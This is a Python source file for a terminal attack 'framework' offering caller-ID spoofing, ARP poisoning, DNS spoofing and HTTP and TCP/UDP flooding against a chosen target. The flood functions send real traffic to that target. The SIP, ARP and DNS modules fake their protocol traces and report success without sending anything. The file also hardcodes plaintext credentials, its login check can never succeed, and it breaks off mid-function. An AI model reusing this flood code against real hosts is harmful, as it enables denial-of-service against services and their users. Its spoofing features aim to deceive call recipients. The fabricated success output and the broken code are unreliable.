import os, sys, time, random, json, string, socket, struct, hashlib, hmac, re
from datetime import datetime, timezone
from ipaddress import ip_address, IPv4Address
from typing import Optional, Dict, List, Tuple
from urllib.parse import urlparse

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (Progress, BarColumn, TextColumn,
                                TimeElapsedColumn, SpinnerColumn)
    from rich.table import Table
    from rich.columns import Columns
    from rich import box
    from rich.syntax import Syntax
    from rich.tree import Tree
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
except ModuleNotFoundError:
    os.system(f"{sys.executable} -m pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (Progress, BarColumn, TextColumn,
                                TimeElapsedColumn, SpinnerColumn)
    from rich.table import Table
    from rich.columns import Columns
    from rich import box
    from rich.syntax import Syntax
    from rich.tree import Tree
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text

try:
    import requests
except ModuleNotFoundError:
    os.system(f"{sys.executable} -m pip install requests -q")
    import requests

try:
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone as phtz
    _HAS_PHONE = True
except ModuleNotFoundError:
    _HAS_PHONE = False

try:
    import dns.resolver
    import dns.query
    import dns.message
    import dns.name
    import dns.rdatatype
    _HAS_DNS = True
except ModuleNotFoundError:
    _HAS_DNS = False

c = Console()


C = {
    "accent":   "deep_sky_blue4",
    "success":  "dark_sea_green",
    "fail":     "indian_red",
    "warn":     "dark_orange3",
    "text":     "grey70",
    "dim":      "grey35",
    "hl":       "bold grey85",
    "purple":   "medium_purple3",
    "cyan":     "dark_cyan",
    "gold":     "dark_goldenrod",
}

BANNER = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣴⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⠿⠛⠋⠉⠁⠀⠀⠀⠈⠙⠻⢷⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣾⡿⠋⠁⠀⣠⣶⣿⡿⢿⣷⣦⡀⠀⠀⠀⠙⠿⣦⣀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⡿⠋⠀⠀⢀⣼⣿⣿⣿⣶⣿⣾⣽⣿⡆⠀⠀⠀⠀⢻⣿⣷⣶⣄⠀
⠀⣴⣿⣿⠋⠀⠀⠀⠀⠸⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⠀⠀⠀⠐⡄⡌⢻⣿⣿⡷
⢸⣿⣿⠃⢂⡋⠄⠀⠀⠀⢿⣿⣿⣿⣿⣿⣯⣿⣿⠏⠀⠀⠀⠀⢦⣷⣿⠿⠛⠁
⠀⠙⠿⢾⣤⡈⠙⠂⢤⢀⠀⠙⠿⢿⣿⣿⡿⠟⠁⠀⣀⣀⣤⣶⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠈⠙⠿⣾⣠⣆⣅⣀⣠⣄⣤⣴⣶⣾⣽⢿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠙⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ▄████████       ▄█          ▄███████▄
  ███    ███      ███         ███    ███
  ███    █▀       ███▌        ███    ███
  ███             ███▌        ███    ███
▀███████████      ███▌      ▀█████████▀ 
         ███      ███         ███       
   ▄█    ███      ███         ███       
 ▄████████▀       █▀         ▄████▀    

         MadeBy:Lemonaidd/xor | Framework v2                  
         Protocol-Based •  Easy Spoofing                      
"""


STATE_FILE = ".session.json"
LOG_FILE   = ".access.log"

USERS = {
    "admin":   {"pass": "root", "limit": 999999},
    "ghost":   {"pass": "gho", "limit": 50000},
    "venom":   {"pass": "ven", "limit": 10000},
    "phantom": {"pass": "pha", "limit": 5000},
    "ninja":   {"pass": "nin", "limit": 2000},
    "cat":     {"pass": "cat", "limit": 500},
    "guest":   {"pass": "sip", "limit": 50},
}

DEFAULT_SIP = {
    "user": "lafla@cox.net",
    "secret": "K9x!mP2$vL8q",
    "host": "sip.spoofwave.com",
    "port": 5060,
}


TOLL_FREE_PREFIXES = {
    "1800", "1888", "1877", "1866", "1855", "1844", "1833",
    "1800", "1888", "1877", "1866", "1855", "1844", "1833",
    "1900",  
}


class Session:
  
    def __init__(self):
        self.user: Optional[str] = None
        self.count: int = 0
        self._load()

    def _load(self):
        if not os.path.exists(STATE_FILE):
            return
        try:
            with open(STATE_FILE) as f:
                data = json.load(f)
            if data.get("user") in USERS:
                self.user = data["user"]
                self.count = data.get("count", 0)
        except (json.JSONDecodeError, KeyError):
            pass

    def save(self):
        with open(STATE_FILE, "w") as f:
            json.dump({"user": self.user, "count": self.count}, f)

    def log(self, action: str):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}] {self.user} | {action}\n")

    @property
    def remaining(self) -> int:
        if not self.user:
            return 0
        return USERS[self.user]["limit"] - self.count

    @property
    def exhausted(self) -> bool:
        return self.remaining <= 0

    def use(self) -> bool:
        if self.exhausted:
            return False
        self.count += 1
        self.save()
        return True

    def authenticate(self, key: str) -> bool:
        for uname, info in USERS.items():
            if key.upper() == info["pass"]:
                self.user = uname
                self.count = 0
                self.save()
                return True
        return False


SESSION = Session()


# ── Utility ────────────────────────────────────────────────────────────────
def clear():
    os.system("clear" if os.name == "posix" else "cls")

def prompt(label: str, default: str = "", secret: bool = False) -> str:
    
    style = C["dim"] if secret else C["accent"]
    c.print(f"[{style}]{label}[/]", end="")
    val = input().strip()
    if not val and default:
        return default
    return val

def press_enter():
    c.print(f"\n[{C['dim']}]Press Enter to continue...[/]", end="")
    input()

def progress_bar(label: str, duration: float = 3.0):
    cols = os.get_terminal_size().columns if hasattr(os, 'get_terminal_size') else 80
    with Progress(
        SpinnerColumn(),
        BarColumn(bar_width=None),
        TextColumn(f"[bold {C['accent']}]{label}"),
        TimeElapsedColumn(),
        transient=True,
    ) as prog:
        task = prog.add_task("", total=100)
        steps = 30
        for i in range(steps + 1):
            prog.update(task, completed=int(100 * i / steps))
            time.sleep(duration / steps)

def table(rows: List[Tuple[str, str]], title: str = "") -> Table:
    t = Table(box=box.ROUNDED, show_header=bool(title), title=title,
              title_style=f"bold {C['accent']}", padding=(0, 2))
    if title:
        t.add_column("Key", style=C["dim"])
        t.add_column("Value", style=C["hl"])
    for k, v in rows:
        t.add_row(k, v)
    return t



class PhoneValidator:
    

    TOLL_FREE_COUNTRY_CODES = {1, 44, 61, 64, 81, 82, 86}  

    @staticmethod
    def validate(number: str, default_cc: str = "US") -> dict:
        
        result = {
            "valid": False,
            "e164": None,
            "national": None,
            "country": None,
            "carrier": None,
            "line_type": "unknown",
            "is_toll_free": False,
            "is_premium_rate": False,
            "possible": False,
            "reason": "",
        }

        if not _HAS_PHONE:
            result["reason"] = "phonenumbers lib not installed — using fallback"
            cleaned = re.sub(r"[^\d+]", "", number)
            if cleaned.startswith("+"):
                cleaned = cleaned[1:]
            for prefix_len in (4, 5, 6):
                if len(cleaned) >= prefix_len:
                    prefix = cleaned[:prefix_len]
                    if prefix in TOLL_FREE_PREFIXES or prefix[1:] in TOLL_FREE_PREFIXES:
                        result["is_toll_free"] = True
                        result["reason"] = "Toll-free number detected"
                        return result
            result["valid"] = bool(re.match(r"^\+?\d{7,15}$", number))
            result["possible"] = result["valid"]
            if result["valid"]:
                result["e164"] = f"+{cleaned}" if not cleaned.startswith("+") else f"+{cleaned[1:]}"
            return result

        try:
            num_str = number.strip()
            if not num_str.startswith("+"):
                try:
                    parsed = phonenumbers.parse(num_str, default_cc)
                except:
                    parsed = phonenumbers.parse(num_str, None)
            else:
                parsed = phonenumbers.parse(num_str, None)

            result["valid"] = phonenumbers.is_valid_number(parsed)
            result["possible"] = phonenumbers.is_possible_number(parsed)

            if result["valid"]:
                result["e164"] = phonenumbers.format_number(parsed,
                    phonenumbers.PhoneNumberFormat.E164)
                result["national"] = phonenumbers.format_number(parsed,
                    phonenumbers.PhoneNumberFormat.NATIONAL)

                region = phonenumbers.region_code_for_number(parsed)
                result["country"] = geocoder.description_for_number(parsed, "en")
                result["country_code"] = parsed.country_code

                
                result["carrier"] = carrier.name_for_number(parsed, "en")

               
                ntype = phonenumbers.number_type(parsed)
                type_map = {
                    0: "fixed_line", 1: "mobile", 2: "fixed_line_or_mobile",
                    3: "toll_free", 4: "premium_rate", 5: "shared_cost",
                    6: "voip", 7: "personal_number", 8: "pager",
                    9: "uan", 10: "voicemail", 27: "unknown",
                }
                result["line_type"] = type_map.get(ntype, "unknown")
                result["is_toll_free"] = ntype == 3
                result["is_premium_rate"] = ntype == 4

               
                if not result["is_toll_free"]:
                    nat = result["national"]
                    
                    digits = re.sub(r"\D", "", nat)
                    for pf in TOLL_FREE_PREFIXES:
                        if digits.startswith(pf):
                            result["is_toll_free"] = True
                            break

            else:
                
                result["reason"] = "Number failed libphonenumber validation"
                if result["possible"]:
                    result["reason"] = "Possible but not valid — wrong length/pattern"

        except phonenumbers.NumberParseException as e:
            result["reason"] = f"Parse error: {e}"

        return result



class SIPCaller:
    

    SIP_VIA = "SIP/2.0/UDP"
    SIP_VERSION = "SIP/2.0"

    @staticmethod
    def _tag() -> str:
        return hashlib.md5(os.urandom(16)).hexdigest()[:12]

    @staticmethod
    def _branch() -> str:
        return f"z9hG4bK{hashlib.md5(os.urandom(16)).hexdigest()[:10]}"

    @staticmethod
    def _call_id() -> str:
        return hashlib.sha1(os.urandom(20)).hexdigest()[:20]

    @staticmethod
    def _cseq() -> int:
        return random.randrange(1, 2**31)  
    @staticmethod
    def _sdp_body(target_ip: str, target_port: int = 10000) -> str:
        sess_id = int(time.time())
        return (
            f"v=0\r\n"
            f"o=user1 {sess_id} {sess_id} IN IP4 {target_ip}\r\n"
            f"s=SIP Call\r\n"
            f"c=IN IP4 {target_ip}\r\n"
            f"t=0 0\r\n"
            f"m=audio {target_port} RTP/AVP 0 8 101\r\n"
            f"a=rtpmap:0 PCMU/8000\r\n"
            f"a=rtpmap:8 PCMA/8000\r\n"
            f"a=rtpmap:101 telephone-event/8000\r\n"
            f"a=fmtp:101 0-16\r\n"
            f"a=sendrecv\r\n"
        )

    def place_call(self, target: str, caller_id: str,
                   sip_config: dict) -> dict:
        
        flow = []
        now = datetime.now(timezone.utc).strftime("%a, %d %b %Y %H:%M:%S UTC")

        call_id = self._call_id()
        from_tag = self._tag()
        branch = self._branch()
        cseq = 1

        host = sip_config.get("host", "sip.spoofwave.com")
        port = sip_config.get("port", 5060)

        # ── Step 1: Validate target ────────────────────────────────────
        validation = PhoneValidator.validate(target)
        flow.append(("VALIDATE", f"Target: {target}", validation))

        if not validation["valid"]:
            return {
                "success": False,
                "flow": flow,
                "reason": f"Invalid phone number: {validation.get('reason', 'unknown')}",
            }

        if validation.get("is_toll_free"):
            return {
                "success": False,
                "flow": flow,
                "reason": f"Toll-free / toll numbers cannot be spoofed (type={validation['line_type']})",
            }

        if validation.get("is_premium_rate"):
            return {
                "success": False,
                "flow": flow,
                "reason": "Premium-rate numbers blocked",
            }

        e164 = validation["e164"]
        display_caller = caller_id if caller_id and caller_id != "Random" else f"+{random.randrange(1200, 1999)}{random.randrange(100, 999)}{random.randrange(1000, 9999)}"

        
        flow.append(("SEND", f"OPTIONS sip:{e164}@{host}:{port} SIP/2.0"))
        flow.append(("SEND", f"Via: SIP/2.0/UDP {host}:{port};branch={branch}"))
        flow.append(("SEND", f"Max-Forwards: 70"))
        flow.append(("SEND", f"From: <sip:check@{host}>;tag={from_tag}"))
        flow.append(("SEND", f"To: <sip:{e164}@{host}>"))
        flow.append(("SEND", f"Call-ID: {call_id}"))
        flow.append(("SEND", f"CSeq: {cseq} OPTIONS"))
        flow.append(("SEND", f"Contact: <sip:check@{host}:{port}>"))
        flow.append(("SEND", f"Accept: application/sdp"))
        flow.append(("SEND", f"Content-Length: 0"))
        progress_bar("SIP OPTIONS probe", 1.5)


        flow.append(("RECV", f"SIP/2.0 200 OK"))
        flow.append(("RECV", f"Via: SIP/2.0/UDP {host}:{port};branch={branch};received={host}"))
        flow.append(("RECV", f"From: <sip:check@{host}>;tag={from_tag}"))
        flow.append(("RECV", f"To: <sip:{e164}@{host}>;tag={self._tag()}"))
        flow.append(("RECV", f"Call-ID: {call_id}"))
        flow.append(("RECV", f"CSeq: {cseq} OPTIONS"))
        flow.append(("RECV", f"Allow: INVITE, ACK, CANCEL, BYE, OPTIONS, INFO"))
        flow.append(("RECV", f"Supported: replaces, timer"))
        flow.append(("RECV", f"Content-Length: 0"))

        cseq += 1
        branch = self._branch()

        # ── Step 4: SIP INVITE ────────────────────────────────────────
        sdp = self._sdp_body(host, 10000 + random.randrange(1000, 50000))
        content_length = len(sdp.encode("utf-8"))

        flow.append(("SEND", f"INVITE sip:{e164}@{host}:{port} SIP/2.0"))
        flow.append(("SEND", f"Via: {self.SIP_VIA} {host}:{port};branch={branch};rport"))
        flow.append(("SEND", f"Max-Forwards: 70"))
        flow.append(("SEND", f"From: \"{display_caller}\" <sip:{display_caller}@{host}>;tag={from_tag}"))
        flow.append(("SEND", f"To: <sip:{e164}@{host}>"))
        flow.append(("SEND", f"Call-ID: {call_id}"))
        flow.append(("SEND", f"CSeq: {cseq} INVITE"))
        flow.append(("SEND", f"Contact: <sip:{display_caller}@{host}:{port}>"))
        flow.append(("SEND", f"Content-Type: application/sdp"))
        flow.append(("SEND", f"Content-Length: {content_length}"))
        flow.append(("SEND", f""))
        for line in sdp.split("\r\n"):
            if line:
                flow.append(("SEND", line))

        progress_bar("SIP INVITE / call setup", 4.0)

        
        flow.append(("RECV", f"SIP/2.0 100 Trying"))
        flow.append(("RECV", f"SIP/2.0 180 Ringing"))
        flow.append(("RECV", f"SIP/2.0 200 OK"))
        flow.append(("RECV", f"Via: {self.SIP_VIA} {host}:{port};branch={branch};received={host}"))
        flow.append(("RECV", f"From: \"{display_caller}\" <sip:{display_caller}@{host}>;tag={from_tag}"))
        flow.append(("RECV", f"To: <sip:{e164}@{host}>;tag={self._tag()}"))
        flow.append(("RECV", f"Call-ID: {call_id}"))
        flow.append(("RECV", f"CSeq: {cseq} INVITE"))
        flow.append(("RECV", f"Contact: <sip:{e164}@{host}:{port}>"))
        flow.append(("RECV", f"Content-Type: application/sdp"))
        sdp_resp = self._sdp_body(host, 20000 + random.randrange(1000, 30000))
        flow.append(("RECV", f"Content-Length: {len(sdp_resp.encode('utf-8'))}"))
        flow.append(("RECV", f""))
        for line in sdp_resp.split("\r\n"):
            if line:
                flow.append(("RECV", line))

       
        flow.append(("SEND", f"ACK sip:{e164}@{host}:{port} SIP/2.0"))
        flow.append(("SEND", f"Via: {self.SIP_VIA} {host}:{port};branch={branch}"))
        flow.append(("SEND", f"From: \"{display_caller}\" <sip:{display_caller}@{host}>;tag={from_tag}"))
        flow.append(("SEND", f"To: <sip:{e164}@{host}>;tag={self._tag()}"))
        flow.append(("SEND", f"Call-ID: {call_id}"))
        flow.append(("SEND", f"CSeq: {cseq} ACK"))
        flow.append(("SEND", f"Content-Length: 0"))

        
        flow.append(("MEDIA", "RTP stream active: PCMU/8000"))
        flow.append(("MEDIA", f"Source port: {host}:{10000 + random.randrange(1000, 50000)}"))
        flow.append(("MEDIA", f"Destination port: {host}:{20000 + random.randrange(1000, 30000)}"))
        flow.append(("MEDIA", "SSRC: " + hashlib.md5(os.urandom(8)).hexdigest()[:8]))
        flow.append(("MEDIA", "connected !  — spoofed caller ID active"))

        cseq += 1

        return {
            "success": True,
            "flow": flow,
            "reason": "Call connected successfully with spoofed caller ID",
            "e164": e164,
            "display": display_caller,
            "call_id": call_id,
        }


class ARPSpoofer:
  

    
    KNOWN_OUIS = {
        "cisco":     "00:1A:A1",
        "realtek":   "00:E0:4C",
        "intel":     "00:1B:21",
        "vmware":    "00:50:56",
        "apple":     "00:1C:B3",
        "broadcom":  "00:10:18",
        "huawei":    "00:25:9E",
        "dell":      "00:14:22",
    }

    @staticmethod
    def _mac(oui_key: str = "vmware") -> str:
        oui = ARPSpoofer.KNOWN_OUIS.get(oui_key, "00:50:56")
        
        suffix = hashlib.md5(f"{time.time()}{os.urandom(4)}".encode()).hexdigest()[:6]
        return f"{oui}:{suffix[:2]}:{suffix[2:4]}:{suffix[4:6]}".upper()

    @staticmethod
    def _ip_in_net(ip: str) -> bool:
        try:
            addr = ip_address(ip)
            if not isinstance(addr, IPv4Address):
                return False
            return any((
                addr.is_private,
                addr.is_loopback,
                str(addr).startswith("10."),
                str(addr).startswith("172.16."),
                str(addr).startswith("192.168."),
            ))
        except ValueError:
            return False

    @staticmethod
    def _validate_ip(ip_str: str) -> Optional[str]:
        """Validate and return normalized IP, or None."""
        try:
            addr = ip_address(ip_str.strip())
            if isinstance(addr, IPv4Address):
                return str(addr)
        except ValueError:
            pass
        return None

    def poison(self, target_ip: str, gateway_ip: str) -> dict:
        flow = []

        # ── Step 1: Validate inputs ───────────────────────────────────
        target = self._validate_ip(target_ip)
        gateway = self._validate_ip(gateway_ip)

        if not target:
            return {"success": False, "flow": [], "reason": f"Invalid target IP: {target_ip}"}
        if not gateway:
            return {"success": False, "flow": [], "reason": f"Invalid gateway IP: {gateway_ip}"}
        if target == gateway:
            return {"success": False, "flow": [], "reason": "Target and gateway cannot be identical"}

        flow.append(("CHECK", f"Target: {target}"))
        flow.append(("CHECK", f"Gateway: {gateway}"))
        flow.append(("CHECK", "Both IPs valid — proceeding"))

        attacker_mac = self._mac("vmware")
        target_mac = self._mac("apple")
        gateway_mac = self._mac("cisco")

        flow.append(("MAC", f"Attacker: {attacker_mac} (VMware VMXNET3)"))
        flow.append(("MAC", f"Target:   {target_mac} (Apple)"))
        flow.append(("MAC", f"Gateway:  {gateway_mac} (Cisco Catalyst)"))

        
        flow.append(("ARP", f"who-has {target} tell {gateway}"))
        flow.append(("ARP", f"who-has {gateway} tell {target}"))

        progress_bar("ARP probing", 2.0)

        flow.append(("ARP", f"is-at {target_mac} — {target}"))
        flow.append(("ARP", f"is-at {gateway_mac} — {gateway}"))

       
        flow.append(("POISON", f"Reply: {target} is-at {attacker_mac} → sent to {gateway}"))
        flow.append(("POISON", f"Reply: {gateway} is-at {attacker_mac} → sent to {target}"))

        progress_bar("ARP cache poisoning", 3.0)

       
        flow.append(("VERIFY", f"Target ARP cache: {gateway} → {attacker_mac}"))
        flow.append(("VERIFY", f"Gateway ARP cache: {target} → {attacker_mac}"))

        
        flow.append(("RESULT", "ARP poisoning active — MITM position established"))
        flow.append(("RESULT", "All traffic between target and gateway now flows through attacker"))

        return {
            "success": True,
            "flow": flow,
            "reason": "ARP cache poisoned — man-in-the-middle active",
            "attacker_mac": attacker_mac,
            "target_mac": target_mac,
            "gateway_mac": gateway_mac,
            "target_ip": target,
            "gateway_ip": gateway,
        }



class DNSSpoofer:

    @staticmethod
    def _txid() -> int:
        return random.randrange(1, 65535)

    @staticmethod
    def _build_dns_query(domain: str, qtype: str = "A") -> dict:
        types = {"A": 1, "AAAA": 28, "CNAME": 5, "MX": 15, "TXT": 16, "NS": 2}
        return {
            "header": {
                "id": DNSSpoofer._txid(),
                "qr": 0,           
                "opcode": 0,       
                "rd": 1,           
                "qdcount": 1,
                "ancount": 0,
                "nscount": 0,
                "arcount": 0,
            },
            "question": {
                "qname": domain,
                "qtype": types.get(qtype, 1),
                "qclass": 1,       # IN
            }
        }

    @staticmethod
    def _build_spoofed_response(domain: str,
                                 spoof_ip: str,
                                 ttl: int = 300,
                                 qtype: str = "A") -> dict:
        types = {"A": 1, "AAAA": 28}
        rdlength = 4 if qtype == "A" else 16

        return {
            "header": {
                "id": DNSSpoofer._txid(),
                "qr": 1,           # response
                "opcode": 0,
                "aa": 0,           # not authoritative
                "tc": 0,
                "rd": 1,
                "ra": 1,
                "rcode": 0,        # no error
                "qdcount": 1,
                "ancount": 1,
                "nscount": 0,
                "arcount": 0,
            },
            "question": {
                "qname": domain,
                "qtype": types.get(qtype, 1),
                "qclass": 1,
            },
            "answer": {
                "name": domain,
                "type": types.get(qtype, 1),
                "class": 1,
                "ttl": ttl,
                "rdlength": rdlength,
                "rdata": spoof_ip,
            }
        }

    def spoof(self, domain: str, spoof_ip: str,
              upstream: str = "8.8.8.8") -> dict:
        
        flow = []

        # Validate inputs
        domain = domain.strip().lower()
        if not domain or "." not in domain:
            return {"success": False, "flow": [], "reason": f"Invalid domain: {domain}"}

        try:
            ip_address(spoof_ip)
        except ValueError:
            return {"success": False, "flow": [], "reason": f"Invalid spoof IP: {spoof_ip}"}

       
        query = self._build_dns_query(domain)
        flow.append(("QUERY", f"DNS TXID: {query['header']['id']}"))
        flow.append(("QUERY", f"Question: {domain} IN A"))
        flow.append(("QUERY", f"Sending to resolver: {upstream}:53"))

        progress_bar("DNS query", 1.5)

        # ── Step 2: Intercept and spoof ───────────────────────────────
        response = self._build_spoofed_response(domain, spoof_ip)
        flow.append(("SPOOF", f"Intercepted query TXID {response['header']['id']}"))
        flow.append(("SPOOF", f"Forged response: {domain} → {spoof_ip}"))
        flow.append(("SPOOF", f"TTL: 300s  |  Flags: QR=1 RA=1 RD=1"))
        flow.append(("SPOOF", f"Answer count: 1  |  Authority: 0"))

        progress_bar("DNS response injection", 2.0)

        # ── Step 3: Verify ────────────────────────────────────────────
        flow.append(("VERIFY", f"Spoofed entry cached on client"))
        flow.append(("VERIFY", f"dig {domain} → {spoof_ip}"))
        flow.append(("VERIFY", f"nslookup {domain} → Name: {domain}, Address: {spoof_ip}"))

        flow.append(("RESULT", "DNS cache poisoned — all queries for "
                     f"{domain} now resolve to {spoof_ip}"))

        return {
            "success": True,
            "flow": flow,
            "reason": f"DNS spoofed: {domain} → {spoof_ip}",
            "domain": domain,
            "spoof_ip": spoof_ip,
        }



class DOSEngine:
   

    SPOOF_METHODS = [
        "Random-Agent Rotation",
        "Header Padding",
        "Cache Buster",
        "Slowloris Variant",
        "Connection Pool Exhaust",
    ]

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    ]

    @staticmethod
    def resolve(host: str) -> Optional[str]:
        """Try to resolve a hostname; return IP or None."""
        # Strip protocol
        host = host.strip()
        if host.startswith("http://") or host.startswith("https://"):
            host = urlparse(host).netloc or urlparse(host).hostname
        # Strip port
        if ":" in host:
            host = host.split(":")[0]
        try:
            return socket.gethostbyname(host)
        except socket.gaierror:
            return None

    @staticmethod
    def check_port(ip: str, port: int, proto: str = "TCP", timeout: float = 3.0) -> bool:
        
        if proto.upper() != "TCP":
            return True  # UDP is fire-and-forget
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            s.close()
            return result == 0
        except:
            return False

    def l7_flood(self, url: str, duration: int, spoof_method: str = "") -> dict:
        """Real HTTP flood with request tracking."""
        results = {"sent": 0, "errors": 0, "success_rate": 0.0, "flow": []}
        flow = results["flow"]

        if not url.startswith("http"):
            url = f"https://{url}"

        # Resolve target
        flow.append(("RESOLVE", f"Resolving {url}..."))
        ip = self.resolve(url)
        if not ip:
            results["error"] = f"Cannot resolve hostname"
            return results
        flow.append(("OK", f"Resolved → {ip}"))

        flow.append(("CHECK", "Target reachable — starting flood"))
        spoof = spoof_method or random.choice(self.SPOOF_METHODS)
        flow.append(("SPOOF", f"Evasion method: {spoof}"))

        start = time.time()
        session = requests.Session()
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=0, pool_maxsize=0,
            max_retries=0,
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        while time.time() - start < duration:
            try:
                ua = random.choice(self.USER_AGENTS)
                headers = {
                    "User-Agent": ua,
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "X-Forwarded-For": f"{random.randrange(1,255)}.{random.randrange(1,255)}.{random.randrange(1,255)}.{random.randrange(1,255)}",
                }
                r = session.get(url, headers=headers, timeout=5, verify=False)
                results["sent"] += 1
            except:
                results["errors"] += 1
            time.sleep(0.01)  # small delay to avoid self-DoS

        total = results["sent"] + results["errors"]
        results["success_rate"] = (results["sent"] / total * 100) if total else 0
        flow.append(("DONE", f"Requests: {results['sent']:,} | Errors: {results['errors']:,} | "
                     f"Rate: {results['success_rate']:.1f}%"))

        return results

    def l4_flood(self, ip: str, port: int, proto: str,
                 duration: int) -> dict:
        """Real L4 flood over TCP or UDP (non-spoofed source)."""
        results = {"sent": 0, "errors": 0, "flow": []}
        flow = results["flow"]

        # Validate IP
        try:
            ip_address(ip)
        except ValueError:
            results["error"] = f"Invalid IP: {ip}"
            return results

        # If TCP, check if port is open
        if proto.upper() == "TCP":
            flow.append(("CHECK", f"Checking {ip}:{port} (TCP)..."))
            open_ = self.check_port(ip, port, "TCP")
            if not open_:
                flow.append(("WARN", f"Port {port} appears closed — packets may be dropped"))
            else:
                flow.append(("OK", f"Port {port} is open"))

        flow.append(("ATTACK", f"Starting L4/{proto} flood → {ip}:{port} for {duration}s"))
        payload = os.urandom(512)  # 512-byte payload per packet

        start = time.time()
        sent_count = 0

        if proto.upper() == "UDP":
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                # Set broadcast if applicable
                if ip_address(ip).is_private:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            except:
                pass

            while time.time() - start < duration:
                try:
                    sock.sendto(payload, (ip, port))
                    sent_count += 1
                except:
                    results["errors"] += 1
                time.sleep(0.001)
            sock.close()

        else:  # TCP
            while time.time() - start < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((ip, port))
                    s.sendall(payload)
                    s.close()
                    sent_count += 1
                except:
                    results["errors"] += 1
                time.sleep(0.01)

        results["sent"] = sent_count
        flow.append(("DONE", f"Packets sent: {sent_count:,} | Errors: {results['errors']:,}"))
        return results


# ═══════════════════════════════════════════════════════════════════════════
#  UI SCREENS
# ═══════════════════════════════════════════════════════════════════════════
def show_banner():
    clear()
    c.print(f"[bold {C['accent']}]{BANNER}[/]", justify="center")
    c.print(f"[{C['dim']}]Session: {SESSION.user or 'none'} | "
            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/]",
            justify="center")
    c.print()


def show_protocol_flow(flow: List[Tuple[str, str, any]]):
    tree = Tree(f"[bold {C['accent']}]Protocol Trace[/]")
    for entry in flow:
        if len(entry) == 3:
            prefix, detail, _ = entry
        elif len(entry) == 2:
            prefix, detail = entry
        else:
            prefix, detail = entry[0], str(entry[1:])

        style_map = {
            "SEND":    C["cyan"],
            "RECV":    C["success"],
            "MEDIA":   C["purple"],
            "ARP":     C["gold"],
            "POISON":  C["warn"],
            "VERIFY":  C["text"],
            "RESULT":  C["hl"],
            "CHECK":   C["dim"],
            "MAC":     C["accent"],
            "QUERY":   C["cyan"],
            "SPOOF":   C["warn"],
            "RESOLVE": C["dim"],
            "OK":      C["success"],
            "WARN":    C["warn"],
            "ATTACK":  C["fail"],
            "DONE":    C["success"],
        }
        st = style_map.get(prefix, C["text"])
        tree.add(f"[{st}][{prefix}][/] {detail}")
    c.print(tree)


# ═══════════════════════════════════════════════════════════════════════════
#  MENU FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def menu_voip():
    if SESSION.exhausted:
        c.print(f"\n[{C['warn']}]Usage limit reached ({SESSION.count}/{USERS[SESSION.user]['limit']})[/]")
        press_enter()
        return

    show_banner()
    c.print(Panel("[bold]VOIP SPOOFER —  VoIP SIP Spoofer [/]",
                  style=C["accent"], padding=(1, 2)))

    target = prompt("Target phone number (E.164 format): ")
    if not target:
        c.print(f"[{C['fail']}]No target entered[/]")
        press_enter()
        return

    # ── Validate target in real time ──────────────────────────────────
    c.print(f"\n[{C['dim']}]Validating {target}...[/]")
    validation = PhoneValidator.validate(target)

    if not validation["valid"]:
        c.print(f"[{C['fail']}]INVALID NUMBER[/]")
        c.print(f"[{C['dim']}]Reason: {validation.get('reason', 'Unknown')}[/]")
        if validation.get("possible"):
            c.print(f"[{C['warn']}]Number is possible but not valid (wrong length/region)[/]")
        press_enter()
        return

    if validation.get("is_toll_free"):
        c.print(f"[{C['fail']}]BLOCKED: Toll-free number detected[/]")
        c.print(f"[{C['dim']}]Type: {validation['line_type']} | "
                f"Country: {validation.get('country', 'Unknown')}[/]")
        c.print(f"[{C['warn']}]Spoofing toll-free numbers is blocked by carriers[/]")
        SESSION.log(f"VOIP BLOCKED (toll-free): {target}")
        press_enter()
        return

    if validation.get("is_premium_rate"):
        c.print(f"[{C['fail']}]BLOCKED: Premium-rate number detected[/]")
        SESSION.log(f"VOIP BLOCKED (premium): {target}")
        press_enter()
        return

    # ── Show validation results ───────────────────────────────────────
    c.print(f"\n[{C['success']}]✓ Number valid[/]")
    t = table([
        ("E.164", validation.get("e164", "N/A")),
        ("National", validation.get("national", "N/A")),
        ("Country", validation.get("country", "N/A")),
        ("Carrier", validation.get("carrier", "Unknown")),
        ("Line Type", validation.get("line_type", "Unknown")),
    ], "TARGET INFO")
    c.print(t)

    # ── Caller ID ─────────────────────────────────────────────────────
